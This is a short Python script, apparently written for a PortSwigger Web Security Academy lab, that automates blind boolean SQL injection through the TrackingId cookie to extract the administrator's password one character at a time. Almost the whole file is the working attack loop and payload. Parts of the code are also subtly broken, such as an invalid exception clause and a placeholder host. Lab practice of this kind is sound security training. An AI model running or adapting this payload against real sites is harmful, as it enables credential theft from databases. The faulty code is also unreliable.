import requests

# IM A FUCKING SKIDDIEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE

def getRes(pos1, pos2, delay=1):
    numReq = 0
    result = []
    for p1 in pos1:
        for p2 in pos2:
            try:
                payload = f"' AND (SELECT SUBSTRING(password,{p1},1) FROM users WHERE username='administrator')='{p2}"
                header = { 
                        'Host': '.web-security-academy.net',
                        'Cookie': f'TrackingId={payload}; session=',
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Accept-Encoding': 'gzip, deflate, br',
                        'Referer': 'https://portswigger.net/',
                        'Upgrade-Insecure-Requests': '1',
                        'Sec-Fetch-Dest': 'document',
                        'Sec-Fetch-Mode': 'navigate',
                        'Sec-Fetch-Site': 'cross-site',
                        'Sec-Fetch-User': '?1',
                        'Priority': 'u=1',
                        'Te': 'trailers',
                        'Connection': 'keep-alive',
                        }
                r = requests.get(f'https://{'addlink here'}.web-security-academy.net/', headers=header)
                res = str(r.text)
                checker = "<div>Welcome back!</div><p>|</p>"
                print(payload)
                if r.status_code == 200:
                    if checker in res:
                        numReq += 1
                        result.append(p2)
                        print(result)
                        print(f"{numReq}: SHEESH" + f"number: {p1} letter: {p2}" )
                    else:
                        numReq += 1
                        print(f"{numReq}: aww wrong payload i think")
                else: 
                    print(f"{numReq+1}RIP")
            except r.raise_for_status as e:
                print(f"oopmgf {e}")
    print("done " + ''.join(result))
            
pos2 = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9']

pos1 = [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]

     

getRes(pos1,pos2, 1)
#first we have to add the payload positions in the original paylaod

#then create a while loop for the request
